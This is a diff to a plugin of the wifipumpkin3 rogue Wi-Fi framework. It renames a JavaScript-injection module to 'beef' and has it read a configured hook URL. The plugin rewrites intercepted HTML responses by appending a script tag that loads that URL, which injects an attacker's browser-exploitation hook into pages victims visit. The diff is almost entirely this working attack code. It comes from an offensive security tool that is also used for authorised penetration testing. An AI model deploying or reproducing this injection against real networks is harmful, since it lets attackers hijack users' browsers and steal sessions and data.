@@ -1,4 +1,4 @@
-from wifipumpkin3.plugins.extension.base import BasePumpkin
+from wifipumpkin3.plugins.pumpkinproxy.base import BasePumpkin
 from os import path
 from bs4 import BeautifulSoup
 
@@ -20,9 +20,9 @@ from bs4 import BeautifulSoup
 # limitations under the License.
 
 
-class js_inject(BasePumpkin):
+class beef(BasePumpkin):
     meta = {
-        "_name": "js_inject",
+        "_name": "beef",
         "_version": "1.1",
         "_description": "url injection insert and use our own JavaScript code in a page.",
         "_author": "by Maintainer",
@@ -30,13 +30,13 @@ class js_inject(BasePumpkin):
 
     @staticmethod
     def getName():
-        return js_inject.meta["_name"]
+        return beef.meta["_name"]
 
     def __init__(self):
         for key, value in self.meta.items():
             self.__dict__[key] = value
         self.ConfigParser = True
-        self.url = self._config.get("set_js_inject", "url")
+        self.urlhook = self.config.get("set_beef", "url_hook")
 
     def handleResponse(self, request, data):
 
@@ -49,7 +49,7 @@ class js_inject(BasePumpkin):
         if html.body:
             url = "{}".format(request.uri)
             metatag = html.new_tag("script")
-            metatag.attrs["src"] = self.url
+            metatag.attrs["src"] = self.urlhook
             metatag.attrs["type"] = "text/javascript"
             html.body.append(metatag)
             data = str(html)
